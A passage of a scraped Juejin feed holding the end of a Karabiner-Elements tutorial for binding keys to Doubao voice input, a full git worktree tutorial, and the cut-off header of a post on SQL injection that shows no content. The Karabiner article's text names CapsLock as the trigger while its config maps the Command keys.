<li>安装工具：从官网（<a href="https://link.juejin.cn?target=https%3A%2F%2Fkarabiner-elements.pqrs.org%2F%25EF%25BC%2589%25E4%25B8%258B%25E8%25BD%25BD" target="_blank" title="https://karabiner-elements.pqrs.org/%EF%BC%89%E4%B8%8B%E8%BD%BD" ref="nofollow noopener noreferrer">karabiner-elements.pqrs.org/）下载</a> Karabiner-Elements，按提示完成系统授权。</li>
</ol>
<h3 data-id="heading-4">四、分步操作流程（全程5分钟）</h3>
<h4 data-id="heading-5">步骤1：进入复合修改配置页</h4>
<p>启动 Karabiner-Elements，点击顶部菜单栏“小地球”→「Preferences」→ 左侧选择「Complex modifications」→ 点击右侧「Add rule」。</p>
<h4 data-id="heading-6">步骤2：创建自定义规则</h4>
<p>点击下方「Create a new rule」，再点击右侧「Open in editor」，进入代码编辑界面（清空原有内容）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/503342a6fa684d7cbad9c0f097011f8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2m5Lmg6Z2e5pq05Yqb5rKf6YCa55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062150&amp;x-signature=aBUwZNbN97kGLSdOievjr2QRPLk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">步骤3：配置映射代码（复制即用）</h4>
<p>粘贴以下代码，默认将「CapsLock」设为触发键（无冲突，推荐使用）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/411ae2d8cc5d4c0ebc74b9fb09a78912~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2m5Lmg6Z2e5pq05Yqb5rKf6YCa55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062150&amp;x-signature=q%2BdeOsSphxRqGQ9xDz%2FKgBRv1fw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css">{
    "description": <span class="hljs-string">"【豆包语音】左Command - 启动"</span>,
    <span class="hljs-string">"manipulators"</span>: [
        {
            "conditions": [
                {
                    "name": <span class="hljs-string">"voice_input_on"</span>,
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                    <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                }
            ],
            "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"left_command"</span> },
            "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"left_command"</span> }],
            "to_if_alone": [
                {
                    "key_code": <span class="hljs-string">"y"</span>,
                    <span class="hljs-string">"modifiers"</span>: [<span class="hljs-string">"command"</span>]
                },
                {
                    "set_variable": {
                        "name": <span class="hljs-string">"voice_input_on"</span>,
                        <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                    }
                }
            ],
            "type": <span class="hljs-string">"basic"</span>
        }
    ]
}
</code></pre>
<h4 data-id="heading-8">步骤4：启用规则并测试</h4>
<ol>
<li>粘贴后自动保存，返回「Complex modifications」页面，开启新建规则的开关（实时生效）；</li>
<li>测试验证：打开豆包，按一次 CapsLock 呼出语音，再按一次关闭，功能正常即配置完成。</li>
</ol>
<h3 data-id="heading-9">五、可选调整（按需修改）</h3>
<p>更换触发键：仅修改代码中「key_code」值即可，示例：</p>
<ul>
<li>右Command键：改为「right_command」；</li>
<li>F12键：改为「f12」。</li>
</ul>
<p>（按键名称可通过 Karabiner「EventViewer」查看，按下按键即可显示对应名称）</p>
<h3 data-id="heading-10">六、常见问题排查</h3>
<ol>
<li>触发无反应：检查规则开关是否开启，豆包是否激活，重启 Karabiner 重试；</li>
<li>快捷键冲突：更换触发键（如右Option、F13），避开常用按键；</li>
<li>重启后失效：配置自动持久化，若失效重新开启规则即可。</li>
</ol>
<h3 data-id="heading-11">七、通过MISC 实现配置</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac78db33f4e44a0ba2d6ba12d439534a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2m5Lmg6Z2e5pq05Yqb5rKf6YCa55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062150&amp;x-signature=kfgDuWnmwPTY0iUAnHv9d6JspLw%3D" alt="image.png" loading="lazy"/>
点击 Misc,之后点击 Open Config folder，编辑karabiner.json，将一下代码直接贴入其中就好。
如果没有karabiner.json文件，可以直接自己创建。（快速实现 Mac 全局创建 json 文件方法：<a href="https://juejin.cn/post/7595289498445201434" target="_blank" title="https://juejin.cn/post/7595289498445201434">juejin.cn/post/759528…</a></p>
<pre><code class="hljs language-css" lang="css">{
    "profiles": [
        {
            "complex_modifications": {
                "rules": [
                    {
                        "description": <span class="hljs-string">"【豆包语音】左Command - 启动"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"left_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"left_command"</span> }],
                                "to_if_alone": [
                                    {
                                        "key_code": <span class="hljs-string">"y"</span>,
                                        <span class="hljs-string">"modifiers"</span>: [<span class="hljs-string">"command"</span>]
                                    },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    },
                    {
                        "description": <span class="hljs-string">"【豆包语音】左Command - 取消"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"left_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"left_command"</span> }],
                                "to_if_alone": [
                                    { "key_code": <span class="hljs-string">"escape"</span> },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    },
                    {
                        "description": <span class="hljs-string">"【豆包语音】右Command - 启动"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"right_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"right_command"</span> }],
                                "to_if_alone": [
                                    {
                                        "key_code": <span class="hljs-string">"y"</span>,
                                        <span class="hljs-string">"modifiers"</span>: [<span class="hljs-string">"command"</span>]
                                    },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    },
                    {
                        "description": <span class="hljs-string">"【豆包语音】右Command - 取消"</span>,
                        <span class="hljs-string">"manipulators"</span>: [
                            {
                                "conditions": [
                                    {
                                        "name": <span class="hljs-string">"voice_input_on"</span>,
                                        <span class="hljs-string">"type"</span>: <span class="hljs-string">"variable_if"</span>,
                                        <span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>
                                    }
                                ],
                                "<span class="hljs-selector-tag">from</span>": { "key_code": <span class="hljs-string">"right_command"</span> },
                                "<span class="hljs-selector-tag">to</span>": [{ "key_code": <span class="hljs-string">"right_command"</span> }],
                                "to_if_alone": [
                                    { "key_code": <span class="hljs-string">"escape"</span> },
                                    {
                                        "set_variable": {
                                            "name": <span class="hljs-string">"voice_input_on"</span>,
                                            <span class="hljs-string">"value"</span>: <span class="hljs-number">0</span>
                                        }
                                    }
                                ],
                                "type": <span class="hljs-string">"basic"</span>
                            }
                        ]
                    }
                ]
            },
            "name": <span class="hljs-string">"Default profile"</span>,
            <span class="hljs-string">"selected"</span>: true,
            <span class="hljs-string">"virtual_hid_keyboard"</span>: { "keyboard_type_v2": <span class="hljs-string">"iso"</span> }
        }
    ]
}
</code></pre>
<h3 data-id="heading-12">八、总结</h3>
<p>通过以上配置，实现 CapsLock 一键控制豆包语音输入启停，操作零延迟、无冲突，一次配置永久生效，适配所有 macOS 场景下的豆包使用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Git 实战：我用 git worktree 一次性拉取多个工作目录]]></title>    <link>https://juejin.cn/post/7595178023256735763</link>    <guid>https://juejin.cn/post/7595178023256735763</guid>    <pubDate>2026-01-15T10:30:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595178023256735763" data-draft-id="7595401278465949737" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Git 实战：我用 git worktree 一次性拉取多个工作目录"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-15T10:30:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ryan_Deng"/> <meta itemprop="url" content="https://juejin.cn/user/1592553166353373"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Git 实战：我用 git worktree 一次性拉取多个工作目录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1592553166353373/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ryan_Deng
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:30:41.000Z" title="Thu Jan 15 2026 10:30:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这篇文章主要讲解 git worktree 在我日常开发工作流中的使用。</p>
<h3 data-id="heading-0">背景说明</h3>
<p>先来看下我的工作场景。</p>
<p>首先，要开发一个新功能，此时拉取一个功能分支，如：“feat/xxx”。
然后测试说生产环境发现一个bug，需要紧急修复，此时拉取一个bug修复分支，如："fix/yyy"。
接着，产品经理说一个紧急需求要做，没办法，再创建一个分支 ，如：“feat/zzz”。</p>
<p>对于这样一个场景，需要在多个分支里工作。我可不想每次代码写一半，然后贮藏起来，这样太麻烦了。</p>
<p>这样，<code>git worktree</code> 就派上用场了。</p>
<p>官方对这个命令的描述是：<strong>一个 git 仓库可以支持多个工作区，允许你一次签出多个分支</strong>。</p>
<h3 data-id="heading-1">使用</h3>
<h4 data-id="heading-2">基础命令</h4>
<p><strong>添加新的工作区</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree add &lt;路径&gt; &lt;分支名&gt;
</code></pre>
<p>例如，为修复 bug 创建一个新的工作区：</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add ../fix-yyy fix/yyy
</code></pre>
<p>这会在当前目录的外层创建一个名为 <code>fix-yyy</code> 的目录，这个目的会处于 <code>fix/yyy</code> 分支。</p>
<p><strong>基于远程分支创建工作区</strong></p>
<p>如果分支在远程仓库但本地没有，可以直接基于远程分支创建：</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add ../fix-yyy origin/fix/yyy
</code></pre>
<p><strong>创建新分支的工作区</strong></p>
<p>如果分支还不存在，使用 <code>-b</code> 参数创建新分支：</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add -b feat/zzz ../feat-zzz
</code></pre>
<p><strong>查看所有工作区</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree list
</code></pre>
<p>输出示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">D</span>:<span class="hljs-regexp">/project/m</span>ain           abc1234 [main]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/project/</span>fix-yyy        def5678 [fix/yyy]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/project/</span>feat-zzz       ghi9012 [feat/zzz]
</code></pre>
<p><strong>删除工作区</strong></p>
<p>工作区可以使用下面命令删除：</p>
<pre><code class="hljs language-bash" lang="bash">git worktree remove &lt;工作区路径&gt;
</code></pre>
<p><strong>清理工作区记录</strong></p>
<p>有时工作区目录被手动删除，但 Git 还记录着，可以用以下命令清理：</p>
<pre><code class="hljs language-bash" lang="bash">git worktree prune
</code></pre>
<h4 data-id="heading-3">实战案例</h4>
<p>让我用一个完整的案例演示如何使用 <code>git worktree</code> 管理多个工作分支。</p>
<p><strong>场景：</strong></p>
<ul>
<li>主项目在 <code>D:\projects\myapp</code> 目录</li>
<li>正在 <code>main</code> 分支开发新功能</li>
<li>突然需要修复生产环境 bug</li>
<li>同时产品经理要求紧急开发一个新功能</li>
</ul>
<p><strong>步骤 1：查看当前状态</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> D:\projects\myapp
git worktree list
</code></pre>
<p>输出：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app  a1b2c3d [main]
</code></pre>
<p><strong>步骤 2：为 bug 修复创建工作区</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 拉取远程最新代码</span>
git fetch origin

<span class="hljs-comment"># 基于远程的 hotfix 分支创建工作区</span>
git worktree add ../myapp-hotfix origin/hotfix/fix-login-issue

<span class="hljs-comment"># 或者创建新的 hotfix 分支</span>
git worktree add -b hotfix/fix-payment ../myapp-hotfix
</code></pre>
<p><strong>步骤 3：为紧急需求创建工作区</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree add -b feat/urgent-feature ../myapp-urgent
</code></pre>
<p><strong>步骤 4：查看所有工作区</strong></p>
<pre><code class="hljs language-bash" lang="bash">git worktree list
</code></pre>
<p>输出：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app          a1b2c3d [main]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app-hotfix   e4f5g6h [hotfix/fix-payment]
<span class="hljs-attr">D</span>:<span class="hljs-regexp">/projects/my</span>app-urgent   i7j8k9l [feat/urgent-feature]
</code></pre>
<p><strong>步骤 5：在不同工作区之间切换</strong></p>
<p>现在你可以在不同的目录中工作，无需切换分支：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 修复 bug</span>
<span class="hljs-built_in">cd</span> D:\projects\myapp-hotfix
<span class="hljs-comment"># ... 编写代码，提交</span>
git add .
git commit -m <span class="hljs-string">"fix: 修复支付问题"</span>
git push origin hotfix/fix-payment

<span class="hljs-comment"># 开发紧急功能</span>
<span class="hljs-built_in">cd</span> D:\projects\myapp-urgent
<span class="hljs-comment"># ... 编写代码，提交</span>
git add .
git commit -m <span class="hljs-string">"feat: 添加紧急功能"</span>
git push origin feat/urgent-feature

<span class="hljs-comment"># 回到主开发</span>
<span class="hljs-built_in">cd</span> D:\projects\myapp
<span class="hljs-comment"># 继续原来的工作</span>
</code></pre>
<p><strong>步骤 6：完成后清理工作区</strong></p>
<p>当分支合并完成后，删除不再需要的工作区：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 删除 hotfix 工作区</span>
git worktree remove ../myapp-hotfix

<span class="hljs-comment"># 删除紧急功能工作区</span>
git worktree remove ../myapp-urgent

<span class="hljs-comment"># 清理已删除工作区的记录</span>
git worktree prune
</code></pre>
<h3 data-id="heading-4">最佳实践</h3>
<h4 data-id="heading-5">1. 统一的目录结构</h4>
<p>建议将所有工作区放在同一父目录下，便于管理：</p>
<pre><code class="hljs language-bash" lang="bash">projects/
├── myapp/          <span class="hljs-comment"># 主工作区（main 分支）</span>
├── myapp-dev/      <span class="hljs-comment"># 开发分支</span>
├── myapp-feat1/    <span class="hljs-comment"># 功能分支 1</span>
├── myapp-feat2/    <span class="hljs-comment"># 功能分支 2</span>
└── myapp-hotfix/   <span class="hljs-comment"># 热修复分支</span>
</code></pre>
<h4 data-id="heading-6">2. 命名规范</h4>
<p>工作区目录命名建议包含项目名和分支类型：</p>
<ul>
<li><code>&lt;项目&gt;-&lt;分支类型&gt;</code> 例如：<code>myapp-dev</code>, <code>myapp-hotfix</code></li>
<li><code>&lt;项目&gt;-&lt;功能描述&gt;</code> 例如：<code>myapp-payment</code>, <code>myapp-auth</code></li>
</ul>
<h4 data-id="heading-7">3. 定期清理</h4>
<p>定期检查并清理不再使用的工作区：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有工作区</span>
git worktree list

<span class="hljs-comment"># 删除不需要的工作区</span>
git worktree remove &lt;路径&gt;

<span class="hljs-comment"># 清理记录</span>
git worktree prune
</code></pre>
<h3 data-id="heading-8">总结</h3>
<p><code>git worktree</code> 是一个非常实用的功能，特别适合需要频繁在多个分支之间切换的场景。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2-03SQL注入漏洞------------2]]></title>    <link>https://juejin.cn/post/7595410455222583306</link>    <guid>https://juejin.cn/post/7595410455222583306</guid>    <pubDate>2026-01-15T10:22:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595410455222583306" data-draft-id="7594835618120368168" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2-03SQL注入漏洞------------2 "/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2026-01-15T10:22:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ey443"/> <meta itemprop="url" content="https://juejin.cn/user/3335244639642203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2-03SQL注入漏洞------------2 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3335244639642203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ey443
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:22:20.000Z" title="Thu Jan 15 2026 10:22:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul 